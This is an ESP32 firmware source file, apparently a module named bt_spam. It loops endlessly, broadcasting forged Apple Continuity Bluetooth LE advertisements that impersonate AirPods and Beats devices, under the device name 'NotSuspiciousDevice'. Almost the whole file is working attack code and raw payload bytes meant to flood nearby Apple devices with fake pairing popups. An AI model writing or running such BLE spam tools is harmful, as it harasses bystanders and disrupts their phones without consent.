#include "bt_spam.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_err.h"
#include "esp_gap_ble_api.h"
#include "esp_log.h"
#include "esp_random.h"

static bt_spam_cb_display display_records_cb = NULL;

static esp_ble_adv_params_t ble_adv_params = {
    .adv_int_min = 0x20,
    .adv_int_max = 0x40,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

const uint8_t long_devices_raw[][31] = {
    // Airpods
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Max
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Gen 2
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Gen 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Airpods Pro Gen 2
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Power Beats
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Power Beats Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Solo Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Buds
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Flex
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats X
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Solo 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio 3
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Betas Fit Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    // Beats Studio Buds Plus
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

const char* long_names_devices[] = {
    "Airpods",
    "Airpods Pro",
    "Airpods Max",
    "Airpods Gen 2",
    "Airpods Gen 3",
    "Airpods Pro Gen 2",
    "Power Beats",
    "Power Beats Pro",
    "Beats Solo Pro",
    "Beats Studio Buds",
    "Beats Flex",
    "Beats X",
    "Beats Solo 3",
    "Beats Studio 3",
    "Beats Studio Pro",
    "Betas Fit Pro",
    "Beats Studio Buds Plus",
};

static uint8_t adv_raw_data[17] = {
    0x10, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x09, 0x09,
    0x02, 0x1E, 0x00, 0x00, 0x10, 0x01, 0x06, 0x20};  // Declarar el arreglo de
                                                      // bytes

// GAP callback
static void esp_gap_cb(esp_gap_ble_cb_event_t event,
                       esp_ble_gap_cb_param_t* param) {
  switch (event) {
    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:

      printf("ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT\n");
      // esp_ble_gap_start_advertising(&ble_adv_params);
      break;

    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
      // esp_ble_gap_start_advertising(&ble_adv_params);
      printf("ESP_GAP_BLE_ADV_START_COMPLETE_EVT\n");
      if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS) {
        printf("Advertising started\n");
      } else
        printf("Unable to start advertising process, error code %d\n",
               param->scan_start_cmpl.status);
      break;

    default:

      printf("Event %d unhandled\n", event);
      break;
  }
}

static void start_adv() {
  while (true) {
    for (int i = 0; i < sizeof(long_devices_raw) / 31; i++) {
      if (display_records_cb) {
        display_records_cb(long_names_devices[i]);
      }
      ESP_ERROR_CHECK(esp_ble_gap_config_adv_data_raw(
          &long_devices_raw[i], sizeof(long_devices_raw[i])));
      esp_ble_gap_start_advertising(&ble_adv_params);
      vTaskDelay(5000 / portTICK_PERIOD_MS);
      esp_ble_gap_stop_advertising();
    }
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }
}
void bt_spam_register_cb(bt_spam_cb_display callback) {
  display_records_cb = callback;
}

void bt_spam_app_main() {
  ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  esp_bluedroid_init();
  esp_bluedroid_enable();
  ESP_ERROR_CHECK(esp_ble_gap_register_callback(esp_gap_cb));
  ESP_ERROR_CHECK(esp_ble_gap_set_device_name("NotSuspiciousDevice"));
  // configure the adv data
  ESP_ERROR_CHECK(esp_ble_gap_config_adv_data_raw(&adv_raw_data, 17));
  vTaskDelay(500 / portTICK_PERIOD_MS);
  xTaskCreate(&start_adv, "start_adv", 2048, NULL, 5, NULL);
}
